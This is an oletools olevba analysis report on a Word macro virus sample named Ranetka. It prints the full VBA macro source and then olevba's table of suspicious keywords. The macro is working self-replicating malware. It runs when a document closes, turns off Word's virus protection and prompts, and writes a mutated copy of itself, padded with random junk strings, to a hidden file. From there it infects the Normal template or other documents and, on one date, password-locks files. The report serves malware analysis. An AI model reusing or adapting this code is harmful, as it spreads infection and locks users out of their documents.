olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ranetka-bbfa45fcc6e230ea8927835f522e41e359162c42bafecce66d3fb0500e3f427b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ranetka-bbfa45fcc6e230ea8927835f522e41e359162c42bafecce66d3fb0500e3f427b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
surp = ActiveDocument.Saved
T$ = ":;aS;?V:jfqKFiA636s^5KC<qp>J\4j@BeIDF;Qt\f[:H`eEOvGH8hU;foYCoLZ`YrRv2]8kNwnUoF;"
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
M$ = "Ux@0lkm@Iy:rb<HLG8=5dkh^Nr=WWHblT@z;rzr2lk1H>8w4Ya^KxZfpCcf3NGl;J3C7ms4l`iac<x8Pr?LxXcqm=WLWcJ"
Z$ = "UjXL"
Randomize Timer
If Dir("c:\windows", vbDirectory) <> "" Then
M$ = "=t=u@8x`yF9Hp@x=DMTdhwpZM^Yj@vN3@o>NFPB:asQuJtO?83ymR[qv0Va;1l"
If Dir("c:\windows\treinfo.___", 6) = "" Then Open "c:\windows\treinfo.___" For Output As #1
Else
R$ = "UmS6Ccf2T1u5eV7uGRJ3Z?jxDfTFJ\pWn1FL3HrK4XZTRJPD>;H3nU]Q5fI>GqV4ficANRjfkm>@UV5263uLM=Uw"
D$ = "6Pr>eVqgcvlT9rXqRYe1Avcw4i]Hrbl8\eWg_1cR;d8o>@tbB`700UQQJ^gmdP4uOIQc`SnKG_<CKTeRK1rv:@wup7CPL"
R$ = "nEs_JPclOYSA:ktbasj"
If Dir("c:\treinfo.___", 6) = "" Then Open "c:\treinfo.___" For Output As #1
E$ = "oor6G:C\=XFr;DUPPv1SiiHPVs1G@7sV?[Io_AgjavUyoE24vJ5ZjtEHVs7s3rgIe7aCHUw1D"
End If
I$ = "p^7JarQx5;VS_VTa1pB?ArHiIF:R=KOJTduV?BN18XiPZCZObwc_X8HorH8Krud_AcI>PnsdPH6TRLj"
For iris = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
alco = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(iris, 1)
E$ = "wlumk]q42I`;iDclfi>VGD"
F$ = "zI5FAjVoDqq5tB7f=xcoI?4oOxs3kB;I4Em=>@MgumBPRcRVBUo:>ZAS1hpBwSGI\4NnzGU?;K4cZfF7>aJaWcNL4SFE"
If iris Mod 2 = 0 And Rnd < 0.3 And alco <> "End Sub" And alco <> "" Then
U$ = ";XxX@?ePSu?<uk5NupumjD@l_Y5MbBeUTduJb;m@i4"
bukva = CInt((90 - 65) * Rnd) + 65
kol_vo = CInt((100 - 1) * Rnd) + 1
Print #1, Chr$(bukva) + "$=" + Chr$(34);
I$ = "8>_@p=7fonYN1;"
For opa = 1 To kol_vo
V$ = "vAL`d<JhUV<pj9@Jae8vGh"
N$ = "R]PCH@@PY\;]Cu3TCIoAl[[oa3QnDqAoIWvv\MeljjtJw9[YxN1ZBuexk=SPV7lQ_T\TYhtIloD\KSr[7SRJ]au6"
znak = CInt((122 - 48) * Rnd) + 48
Print #1, Chr$(znak);
Q$ = "OfA_:?H;XRKp<XY?[BmXR8okp]ZFbZgiPvriIdM?W4t:Vu1v5_5Y;nL8?g]"
Next opa
T$ = "6;];vkCk^@rOIY`38Ytdr@=Kkwn7kfUKPaNkyg9viqXYc9yo8BkArPr:gKp@lQ3dTF63T]Wi=4tg<]nN;6UUtmIw"
T$ = "rPlngfZqvN1L96[<_Fx:"
B$ = "KL`3fe\b`fSWyLg>bQQeS>1myNQZrWe"
Print #1, Chr$(34)
Print #1, alco
Else
Print #1, alco
B$ = "kbs7X<[sq4ShuCsX]Sp6vk9tt_VFLm[P<3J5cQP=YYI2UL5QbovE3MaB4tapbo`jY]SCR=?vx5OsWMlpSF2"
E$ = ":FJ5sJJm^Zn<R"
J$ = "^RYoo;_Qo:r<QFoEPXkajAeE:m@1Nm1_pjK6Bm2x?A@N6G4tl\2"
End If
Next iris
F$ = "V2Lj`T_OiJ`je_hv;qZ5Hvrm5qou5=DwMAGRAyNAvxJxFPc4ylO\QQkoiWZc5ICXw]sMEIt8=`<7J4P1Xq6xFyng4c2"
Close #1
SetAttr "c:\treinfo.___", 6
X$ = "\kH\`YXbS;lp4;iMYdChBVUImzU>xkb9zRg"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
O$ = "6:?"
Set times = NormalTemplate.VBProject.VBComponents.Item(1)
P$ = "YrOKMK;uce_4gYLLNs[FHN]iOk_MfYSfLtkrm1PLNN899cCp[X@bJqZnNDnrwhGxMaCN[sCSPNp[[kUWPK[7"
D$ = "fHutdWDJEOrhTl1mIOxi>wCWKI^8rC\@`s=Abyh@e2KQ9o"
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set times = ActiveDocument.VBProject.VBComponents.Item(1)
V$ = "tgp8FwO8Y^RB`9lp1VOsTZ14XBoGc@njCtp^"
Y$ = "f2RJX8rA]282@PMpk_>[aDp31CxfB3XXNwku140<4u\vB1_AXzJEsV;4J:`e=X9URx:jtxOOjD3F@4g>cMannv:"
Else
times = ""
V$ = "8aPC7`xS>EUf7mOdG1Sqs3=_McFNv`gDtB`dSF`ZZ@UM"
End If
Y$ = "?E>13s>bM5DtMA_XaCAxyc0b3CKhY]os[M8R8T8qoUYHMY_ZPHv<PBbjO58r2`"
If ActiveDocument.Saved <> surp Then ActiveDocument.Saved = surp
If times <> "" Then
If Dir("c:\windows\treinfo.___", 6) <> "" Then
Open "c:\windows\treinfo.___" For Input As #1
I$ = "=G:M>3sY\P?PjZsE\FRZ=SSBC?[BZ^TDYfElGT6NnFj9N[>NJcHxx1y@hR`]kxPVYWW?i?e:b_BPRZnavn8qYS3oX4"
Else
P$ = "Zy[`[ErM`UA]Tl=PCyQWYZTI]AG_bQ[AmLv5owYPQKwSe_>yoU2N5^]9nrEsH:`h8xst6wP5e1\sVyn"
Open "c:\treinfo.___" For Input As #1
End If
D$ = "YRVyqdQPyF"
If LOF(1) = 0 Then GoTo eofuck
O$ = "V]RSxEW>BKoj2\hYRFm8j`3i4BFAHh3Ms4EYyMjiPxSXqf@]4"
A$ = "FYT]a^13XeqDZb5ca\vSJfBgGnBw@cBYnjCnJQu7tzm2TIkLvd"
B$ = "9jJPTNYimZoo3m[J]6;y2>y>Srw?lvtHiRVKL]FVfU3BpGGd0_F72?rY9g37j"
iris = 1
G$ = "`2BC@SgUTtskY:A=\cmrAitj<E`69;2BwtBE0Y>8lZ>GtE15:T@Kj<YQQamXk0mgkNbG2=E4Kf:4o1I_pwkXSOoN8<vOODaLSa3"
X$ = "[Z"
Do While Not EOF(1)
Line Input #1, alco
Y$ = "AQ[FQ"
times.CodeModule.InsertLines iris, alco
Q$ = "5@B;?cN;rdLTPayN^TYo?Do?Z;ZHeQglP6gSk="
iris = iris + 1
Loop
U$ = "MkO2uTbQMC?aX_sG[isGkaiGIduEGMOS5LkSriMab[dm;V:561vsvURdfqUGvH8u5ESD1j<u5o[3oL`>e7fTJlu3W0PXBUF<1XJ"
D$ = "cZcdX`mNHhHkhpyziAvCw;7K=4uPTpXhCWp7Zq@5ne2sf7t"
eofuck:
Close #1
Y$ = "sItvD7Lc27jU`FHh]U^Eu0u@oOMtgt]JLWYUHmW=bm]4269q_:X5s8ZM4_M17uJk5FciP`cuiQx?mr5j\BF]qQi8r:i"
Rem Alliance Copyleft (L) & VlasihaSoft ïðåäñòàâëÿþò ñâîé ïåðâûé
T$ = "wo<SEC6[\ejXl45wukgY^[;Cqq>X<yIwX;92H7eDgaoZxmwdSoX@OjlUS6_6rb\@b6Qf:qe8bR]kjs<hHB[LyrxT:I;`j"
C$ = "5>nXOsW;i\Z4Corzt_UZHD>pUm`Sz^_`J;Wkc68:_^ZcP8hSIkcwFwJgj@eYx8vM8ux4>lAhk3d=D^;[:9_G"
Rem ìàêðî-âèðóñ RanetkA v1.0 ñ ñîáñòâåííûì KoT Mutation Engine v1.0
Rem Ñ íÀèëÓ÷ØÈìè ÏÎæÅëàíèßìÈ,  KoToV !
D$ = "\jhpR;2=J<<Z7O:^BKRMt\=I5P7YfhK>h:>=a3p>jX4ka4FxcSgj1QAI_1SwnMbem2?1[3_a4_40U6"
If Left$(Application.UserName, 2) <> "Áî" And Mid$(Date$, 2, 4) = "4-23" Then Word.ActiveDocument.Password = "KoT"
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

